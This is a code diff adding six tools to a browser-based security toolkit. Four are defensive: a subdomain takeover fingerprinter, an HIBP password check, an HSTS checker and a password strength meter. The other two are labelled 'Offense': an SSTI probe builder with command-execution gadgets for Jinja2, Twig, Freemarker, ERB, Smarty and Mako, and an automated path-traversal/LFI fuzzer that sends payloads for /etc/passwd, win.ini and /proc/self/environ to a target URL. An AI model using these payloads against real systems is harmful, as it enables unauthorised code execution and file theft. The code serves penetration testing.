@@ -634,6 +634,13 @@ const UNIVERSAL_TOOLS = [
   { id:"jwks-inspector", name:"JWKS Inspector",    icon:"🧷", cat:"Crypto", desc:"Fetch and parse a JWKS endpoint — list keys with kid/alg/use and compute RFC7638 thumbprints.", feat:["kid/alg","thumbprint","RSA/EC"] },
   { id:"sri-checker",    name:"SRI Checker",       icon:"🔗", cat:"Web", desc:"Find cross-origin scripts and styles loaded without Subresource Integrity — a supply-chain risk.", feat:["integrity","third-party","supply chain"] },
   { id:"txt-parser",     name:"robots / security.txt", icon:"🤖", cat:"Recon", desc:"Fetch and parse robots.txt, security.txt and sitemap.xml — disallowed paths often reveal hidden endpoints.", feat:["disallow paths","contacts","sitemap"] },
+  // --- wave 7 ---
+  { id:"takeover",       name:"Subdomain Takeover", icon:"🏴", cat:"Recon", desc:"Resolve a host's CNAME and fingerprint dangling cloud services (GitHub Pages, S3, Heroku, Azure…) for takeover.", feat:["CNAME","fingerprints","dangling"] },
+  { id:"pwned-pass",     name:"Pwned Password",    icon:"🔥", cat:"Crypto", desc:"Check a password against Have I Been Pwned using k-anonymity — the password never leaves your device.", feat:["HIBP","k-anonymity","SHA-1 prefix"] },
+  { id:"ssti-builder",   name:"SSTI Builder",      icon:"🧩", cat:"Offense", desc:"Per-engine server-side template injection probes (Jinja2, Twig, Freemarker, ERB, Velocity…) and a polyglot.", feat:["Jinja2/Twig","polyglot","engine ID"] },
+  { id:"lfi-tester",     name:"Path Traversal / LFI", icon:"📂", cat:"Offense", desc:"Test a parameter for path traversal / local file inclusion with layered encodings and file-content signatures.", feat:["../ depths","encodings","/etc/passwd"] },
+  { id:"hsts-checker",   name:"HSTS Checker",      icon:"🛤️", cat:"Web", desc:"Inspect Strict-Transport-Security — max-age, includeSubDomains, preload eligibility.", feat:["max-age","preload","includeSubDomains"] },
+  { id:"pw-strength",    name:"Password Strength", icon:"💪", cat:"Crypto", desc:"Estimate password entropy and crack time, and flag weak patterns — fully offline.", feat:["entropy","crack time","patterns"] },
 ];
 
 // Desktop-only factory — invoked ONLY when Platform.mode === "desktop".
@@ -3675,6 +3682,183 @@ Impl["txt-parser"] = (root) => {
     UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Fetch & parse", run, "primary"))),
     UIKit.panel("Report", null, o.node));
   url.input.addEventListener("keydown", e => { if (e.key === "Enter") run(); });
+};
+
+/* ===================== SUBDOMAIN TAKEOVER ===================== */
+const TAKEOVER_SIGS = [
+  { svc: "GitHub Pages", cname: /github\.io/i, body: /There isn't a GitHub Pages site here|For root URLs/i },
+  { svc: "AWS S3", cname: /s3[.-].*amazonaws\.com|s3\.amazonaws/i, body: /NoSuchBucket|The specified bucket does not exist/i },
+  { svc: "Heroku", cname: /herokuapp\.com|herokudns/i, body: /No such app|herokucdn\.com\/error/i },
+  { svc: "Azure", cname: /azurewebsites\.net|cloudapp\.net|trafficmanager\.net|blob\.core\.windows\.net/i, body: /404 Web Site not found|The specified blob does not exist/i },
+  { svc: "Fastly", cname: /fastly\.net/i, body: /Fastly error: unknown domain/i },
+  { svc: "Shopify", cname: /myshopify\.com/i, body: /Sorry, this shop is currently unavailable/i },
+  { svc: "Surge.sh", cname: /surge\.sh/i, body: /project not found/i },
+  { svc: "Pantheon", cname: /pantheonsite\.io/i, body: /The gods are wise, but do not know of the site/i },
+  { svc: "Cargo", cname: /cargocollective\.com/i, body: /404 Not Found/i },
+  { svc: "Bitbucket", cname: /bitbucket\.io/i, body: /Repository not found/i },
+  { svc: "Ghost", cname: /ghost\.io/i, body: /Domain error|The thing you were looking for is no longer here/i },
+];
+Impl["takeover"] = (root) => {
+  const host = UIKit.field("Host", { placeholder: "blog.example.com", mono: true });
+  const o = UIKit.out();
+  const run = async () => {
+    o.clear();
+    const h = host.input.value.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+    if (!h) return o.line("enter a host", "err");
+    o.line("resolving CNAME for " + h + "…", "dim");
+    let cname = "";
+    try { const d = await Net.doh(h, "CNAME"); cname = (d.Answer || []).map(a => a.data).join(", "); } catch {}
+    if (cname) o.line("CNAME → " + cname, "v"); else o.line("no CNAME (checking A + body anyway)", "dim");
+    const sig = TAKEOVER_SIGS.find(s => s.cname.test(cname));
+    if (sig) o.line("points at " + sig.svc, "warn");
+    o.line(""); o.line("fetching content for fingerprint…", "dim");
+    let body = "";
+    try { body = await (await Net.fetchURL("https://" + h)).text(); } catch (e) { o.line("fetch note: " + e.message + " (CORS/unreachable)", "dim"); }
+    let hit = null;
+    for (const s of TAKEOVER_SIGS) if (s.body.test(body) && (!cname || s.cname.test(cname) || true)) { hit = s; break; }
+    o.line("");
+    if (hit) o.line("⚠ POTENTIAL TAKEOVER — " + hit.svc + " fingerprint matched. If the backing resource is unclaimed, this subdomain can be hijacked.", "err");
+    else if (sig) o.line("dangling-looking CNAME to " + sig.svc + " but no error fingerprint — verify manually", "warn");
+    else o.line("no takeover fingerprint detected", "ok");
+    History.add("Takeover", h + (hit ? " · " + hit.svc : ""));
+  };
+  root.append(
+    UIKit.panel("Host", null, host.wrap, el("div", { class: "row" }, UIKit.btn("Check", run, "primary"))),
+    UIKit.panel("Report", null, o.node));
+  host.input.addEventListener("keydown", e => { if (e.key === "Enter") run(); });
+};
+
+/* ===================== PWNED PASSWORD (HIBP k-anonymity) ===================== */
+Impl["pwned-pass"] = (root) => {
+  const pw = UIKit.field("Password", { type: "password", placeholder: "checked via k-anonymity — never sent", mono: true });
+  const o = UIKit.out();
+  const run = async () => {
+    o.clear();
+    const p = pw.input.value; if (!p) return o.line("enter a password", "err");
+    const hash = (await hashStr("SHA-1", p)).toUpperCase();
+    const prefix = hash.slice(0, 5), suffix = hash.slice(5);
+    o.line("SHA-1: " + prefix + "…  (only the 5-char prefix is sent)", "dim");
+    try {
+      const r = await fetch("https://api.pwnedpasswords.com/range/" + prefix);
+      if (!r.ok) return o.line("HIBP HTTP " + r.status, "err");
+      const txt = await r.text();
+      const line = txt.split("\n").find(l => l.split(":")[0].trim() === suffix);
+      if (line) { const count = parseInt(line.split(":")[1]); o.line("", ""); o.line("⚠ BREACHED — seen " + count.toLocaleString() + " times in known breaches. Do not use this password.", "err"); }
+      else o.line("\n✓ not found in Have I Been Pwned's breach corpus", "ok");
+      History.add("Pwned Password", line ? "breached" : "clean");
+    } catch (e) { o.line("request failed: " + e.message, "err"); }
+  };
+  root.append(
+    UIKit.panel("Check", null, pw.wrap, el("div", { class: "row" }, UIKit.btn("Check HIBP", run, "primary"), el("span", { class: "hint" }, "k-anonymity: only a SHA-1 prefix leaves the device"))),
+    UIKit.panel("Result", null, o.node));
+  pw.input.addEventListener("keydown", e => { if (e.key === "Enter") run(); });
+};
+
+/* ===================== SSTI BUILDER ===================== */
+const SSTI_ENGINES = {
+  "Detection polyglot": "${{<%[%'\"}}%\\.", "Jinja2 / Flask (Python)": "{{7*7}}  →49 · {{config}} · {{''.__class__.__mro__[1].__subclasses__()}}",
+  "Twig (PHP)": "{{7*7}}  →49 · {{_self.env.registerUndefinedFilterCallback('exec')}}", "Freemarker (Java)": "${7*7}  →49 · <#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
+  "Velocity (Java)": "#set($x=7*7)$x · #set($e=$x.class.forName('java.lang.Runtime'))", "ERB (Ruby)": "<%= 7*7 %>  →49 · <%= system('id') %>",
+  "Smarty (PHP)": "{7*7}  →49 · {php}system('id');{/php} · {system('id')}", "Handlebars (Node)": "{{#with 'x'}}{{this}}{{/with}}",
+  "Mako (Python)": "${7*7}  →49 · ${self.module.cache.util.os.system('id')}", "Pug / Jade (Node)": "#{7*7}  →49",
+};
+Impl["ssti-builder"] = (root) => {
+  const list = el("div", {});
+  for (const [eng, payload] of Object.entries(SSTI_ENGINES)) {
+    const probe = payload.split("  →")[0].split(" · ")[0];
+    list.appendChild(el("div", { class: "list-row" }, el("div", { class: "lr-main" }, el("div", { class: "lr-title" }, eng), el("code", { class: "lr-sub", style: "white-space:pre-wrap;word-break:break-all" }, payload)), UIKit.copyBtn(probe)));
+  }
+  root.append(
+    UIKit.panel("SSTI probes by engine", null, el("div", { class: "hint", style: "margin-bottom:8px" }, "send the math probe first; if it evaluates (e.g. 49), use the engine-specific RCE gadget. The Injection Tester can auto-detect evaluation."), list));
+};
+
+/* ===================== PATH TRAVERSAL / LFI ===================== */
+const LFI_PAYLOADS = ["../../../../../../etc/passwd", "....//....//....//....//etc/passwd", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd", "....\\\\....\\\\....\\\\windows\\\\win.ini", "..\\..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "....//....//windows/win.ini", "..%c0%af..%c0%afetc/passwd"];
+const LFI_SIG = /root:.*:0:0:|daemon:x:|\[fonts\]|\[extensions\]|for 16-bit app support|\bHTTP_USER_AGENT=/i;
+Impl["lfi-tester"] = (root) => {
+  const method = UIKit.select("Method", ["GET", "POST"]);
+  const url = UIKit.field("URL (FUZZ = injection point)", { placeholder: "https://site.com/?file=FUZZ", mono: true });
+  const o = UIKit.out();
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "payload"), el("th", {}, "status"), el("th", {}, "bytes"), el("th", {}, "signal"))), tbody);
+  const run = async () => {
+    o.clear(); tbody.innerHTML = "";
+    const u = url.input.value.trim();
+    if (!u.includes("FUZZ")) return o.line("put FUZZ where the filename goes", "err");
+    let hits = 0;
+    for (const pl of LFI_PAYLOADS) {
+      try {
+        const r = await HttpKit.send({ method: method.input.value, url: u.replace(/FUZZ/g, encodeURIComponent(pl)) });
+        const sig = LFI_SIG.test(r.text);
+        if (sig) hits++;
+        if (sig || r.status < 400) tbody.appendChild(el("tr", {}, el("td", {}, pl.slice(0, 34)), el("td", { class: r.status < 400 ? "ok" : "dim" }, String(r.status)), el("td", {}, String(r.size)), el("td", { class: sig ? "sev-crit" : "muted" }, sig ? "⚠ file content leaked" : "")));
+      } catch {}
+    }
+    o.line(hits ? "⚠ " + hits + " payload(s) returned file contents — LFI/traversal confirmed" : "no file-content signature detected", hits ? "err" : "ok");
+    History.add("LFI Tester", u + " · " + hits);
+  };
+  root.append(
+    UIKit.panel("Target", null, el("div", { class: "toolbar" }, method.wrap, url.wrap), el("div", { class: "row" }, UIKit.btn("Test traversal", run, "primary"))),
+    UIKit.panel("Log", null, o.node),
+    UIKit.panel("Results", null, el("div", { style: "max-height:320px;overflow:auto" }, tbl)));
+};
+
+/* ===================== HSTS CHECKER ===================== */
+Impl["hsts-checker"] = (root) => {
+  const url = UIKit.field("HTTPS URL", { placeholder: "https://your-site.com", value: "https://", mono: true });
+  const o = UIKit.out();
+  const run = async () => {
+    o.clear();
+    const u = url.input.value.trim();
+    if (!/^https:\/\//.test(u)) return o.line("enter an https:// URL", "err");
+    let hsts = "";
+    try { hsts = (await Net.fetchURL(u)).headers.get("strict-transport-security") || ""; }
+    catch (e) { return o.line("fetch failed: " + e.message + " (header may be hidden by CORS — try a proxy)", "err"); }
+    if (!hsts) return o.line("✗ no Strict-Transport-Security header — site not HSTS protected", "err");
+    o.line("HSTS: " + hsts, "v"); o.line("");
+    const maxAge = parseInt((hsts.match(/max-age=(\d+)/i) || [])[1] || "0");
+    const subs = /includeSubDomains/i.test(hsts), preload = /preload/i.test(hsts);
+    o.line((maxAge >= 31536000 ? "✓" : "⚠") + " max-age = " + maxAge + "s (" + (maxAge / 86400).toFixed(0) + " days)", maxAge >= 31536000 ? "ok" : "warn");
+    o.line((subs ? "✓" : "✗") + " includeSubDomains", subs ? "ok" : "warn");
+    o.line((preload ? "✓" : "✗") + " preload", preload ? "ok" : "warn");
+    o.line("");
+    o.line(maxAge >= 31536000 && subs && preload ? "✓ eligible for the HSTS preload list" : "⚠ not preload-eligible (needs max-age≥31536000 + includeSubDomains + preload)", maxAge >= 31536000 && subs && preload ? "ok" : "warn");
+    History.add("HSTS Checker", u);
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Check", run, "primary"))),
+    UIKit.panel("Report", null, o.node));
+};
+
+/* ===================== PASSWORD STRENGTH ===================== */
+const COMMON_PW = ["password", "123456", "123456789", "qwerty", "111111", "12345678", "abc123", "1234567", "password1", "12345", "iloveyou", "admin", "welcome", "monkey", "dragon", "letmein", "football", "qwerty123"];
+Impl["pw-strength"] = (root) => {
+  const pw = UIKit.field("Password", { type: "text", placeholder: "type a password (offline)", mono: true });
+  const o = UIKit.out();
+  const meter = el("i", {}); const bar = el("div", { class: "bar" }, meter);
+  const analyze = () => {
+    const p = pw.input.value;
+    if (!p) { o.set("—"); meter.style.width = "0"; return; }
+    let cs = 0; if (/[a-z]/.test(p)) cs += 26; if (/[A-Z]/.test(p)) cs += 26; if (/[0-9]/.test(p)) cs += 10; if (/[^a-zA-Z0-9]/.test(p)) cs += 33;
+    const bits = +(p.length * Math.log2(cs || 1)).toFixed(1);
+    const guesses = Math.pow(2, bits); const perSec = 1e10; // offline GPU-ish
+    const secs = guesses / perSec;
+    const human = secs < 1 ? "instant" : secs < 60 ? secs.toFixed(0) + "s" : secs < 3600 ? (secs / 60).toFixed(0) + "m" : secs < 86400 ? (secs / 3600).toFixed(0) + "h" : secs < 3.15e7 ? (secs / 86400).toFixed(0) + "d" : secs < 3.15e9 ? (secs / 3.15e7).toFixed(0) + "y" : (secs / 3.15e7).toExponential(1) + " y";
+    const issues = [];
+    if (COMMON_PW.includes(p.toLowerCase())) issues.push("✗ in the top-common-passwords list");
+    if (/(.)\1{2,}/.test(p)) issues.push("⚠ repeated characters");
+    if (/(?:0123|1234|2345|3456|4567|5678|6789|abcd|qwer|asdf)/i.test(p)) issues.push("⚠ sequential/keyboard pattern");
+    if (/^(19|20)\d{2}$/.test(p) || /\b(19|20)\d{2}\b/.test(p)) issues.push("⚠ contains a year");
+    if (p.length < 12) issues.push("⚠ shorter than 12 characters");
+    const score = COMMON_PW.includes(p.toLowerCase()) ? 0 : Math.min(100, bits);
+    meter.style.width = Math.min(100, score) + "%";
+    meter.style.background = score < 40 ? "var(--red)" : score < 70 ? "var(--amber)" : "var(--accent)";
+    o.set("entropy   : " + bits + " bits\ncharset   : " + cs + " symbols\nlength    : " + p.length + "\ncrack time: ~" + human + " (at 10^10 guesses/s)\nrating    : " + (score < 40 ? "WEAK" : score < 70 ? "FAIR" : score < 100 ? "STRONG" : "VERY STRONG") + (issues.length ? "\n\n" + issues.join("\n") : ""));
+  };
+  pw.input.addEventListener("input", analyze);
+  root.append(
+    UIKit.panel("Password", null, pw.wrap, bar, el("div", { class: "hint" }, "100% local — nothing is transmitted")),
+    UIKit.panel("Analysis", null, o.node));
 };
 
 /* ===================== HISTORY (shared) ===================== */
